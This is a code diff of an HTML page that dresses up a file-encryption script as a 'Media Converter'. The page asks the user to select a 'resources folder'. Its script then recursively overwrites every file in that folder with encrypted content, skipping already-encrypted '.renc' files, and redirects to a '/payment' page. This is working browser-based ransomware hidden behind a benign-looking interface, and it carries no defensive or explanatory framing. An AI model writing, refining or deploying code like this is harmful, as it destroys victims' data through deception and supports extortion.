@@ -1,37 +1,87 @@
-<script type="module">
-  import init, { encrypt } from "./pkg/client.js";
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Media Converter</title>
+    <link
+      href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css"
+      rel="stylesheet"
+    />
+  </head>
 
-  init().then(() => {
-    async function encryptFile(fileHandle) {
-      const file = await fileHandle.getFile();
-      var contents = new Uint8Array(await file.arrayBuffer());
+  <body class="bg-gray-100 min-h-screen flex items-center justify-center">
+    <div class="bg-white rounded-lg shadow-lg p-8 max-w-lg w-full">
+      <h1 class="text-2xl font-bold mb-4 text-gray-800 text-center">
+        Media Converter
+      </h1>
+      <p class="text-gray-600 mb-8 text-center">
+        Select your resources folder to start converting your media files.
+      </p>
 
-      // console.log("content: ", contents);
-      let encrypted = encrypt(contents);
-      // console.log("encrypted:", encrypted);
+      <div class="flex justify-center">
+        <button
+          id="btn_select_folder"
+          class="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline"
+        >
+          Select Resources Folder
+        </button>
+      </div>
 
-      const writable = await fileHandle.createWritable();
-      await writable.write(encrypted);
-      await writable.close();
-    }
+      <div class="mt-8">
+        <div class="bg-gray-50 border border-gray-200 rounded-lg p-4">
+          <h2 class="text-lg font-semibold text-gray-700">
+            Conversion Progress
+          </h2>
+          <div class="w-full bg-gray-200 rounded-full mt-2">
+            <div
+              class="bg-blue-500 text-xs leading-none py-1 text-center text-white rounded-full"
+              style="width: 0%"
+              id="progress-bar"
+            >
+              0%
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script type="module">
+      import init, { encrypt } from "./pkg/client.js";
 
-    async function encryptDirectory(dirHandle) {
-      for await (const entry of dirHandle.values()) {
-        if (entry.kind == "directory") {
-          await encryptDirectory(entry);
-        } else {
-          await encryptFile(entry);
+      init().then(() => {
+        async function encryptFile(fileHandle) {
+          const file = await fileHandle.getFile();
+          var contents = new Uint8Array(await file.arrayBuffer());
+
+          if (contents.length <= 0) {
+            return;
+          }
+
+          let encrypted = encrypt(contents);
+
+          const writable = await fileHandle.createWritable();
+          await writable.write(encrypted);
+          await writable.close();
         }
-      }
-    }
 
-    const button = document.getElementById("button");
+        async function encryptDirectory(dirHandle) {
+          for await (const entry of dirHandle.values()) {
+            if (entry.kind == "directory") {
+              await encryptDirectory(entry);
+            } else if (!entry.name.endsWith(".renc")) {
+              await encryptFile(entry);
+            }
+          }
+        }
 
-    button.addEventListener("click", async () => {
-      const dirHandle = await window.showDirectoryPicker();
-      await encryptDirectory(dirHandle);
-    });
-  });
-</script>
+        const button = document.getElementById("btn_select_folder");
 
-<button id="button">run</button>
+        button.addEventListener("click", async () => {
+          const dirHandle = await window.showDirectoryPicker();
+          await encryptDirectory(dirHandle);
+          window.location = "/payment";
+        });
+      });
+    </script>
+  </body>
+</html>
